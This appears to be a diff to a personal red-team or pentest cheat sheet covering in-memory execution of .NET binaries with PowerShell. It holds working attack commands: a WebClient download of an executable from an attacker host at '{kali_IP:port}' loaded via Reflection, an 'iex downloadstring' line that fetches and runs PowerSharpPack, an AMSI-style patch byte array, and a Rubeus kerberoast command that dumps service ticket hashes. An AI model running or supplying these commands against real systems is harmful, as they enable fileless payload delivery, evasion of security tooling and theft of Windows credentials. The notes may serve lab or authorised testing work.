@@ -114,7 +114,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 $data=(New-Object System.Net.WebClient).DownloadData('http://{kali_IP:port}/{exe_binary}');
 $asm = [System.Reflection.Assembly]::Load([byte[]]$data);
 $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
-[{binary_name}.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
+[{binary_name}.Program]::Main(@('{params}'));[Console]::SetOut($out);$sWriter.ToString()
 
 ## Thread Injection
 - Operates within the process it's being executed from
@@ -125,7 +125,7 @@ $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($s
 - If instead of dealing with executables we'd just like to use powershell, we can use [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
     - `iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpPack.ps1 -o psp.ps1`
     - Insanely useful powershell script that has C# executables bundled into it as compiled base64 binaries
-    - Run with `iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')` and `PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`, for example
+    - Run with `iex(new-object net.webclient).downloadstring('http://{kali_IP:port}/PowerSharpPack.ps1')` and `PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`, for example
 
 # Import VirtualAlloc to allocate memory
 
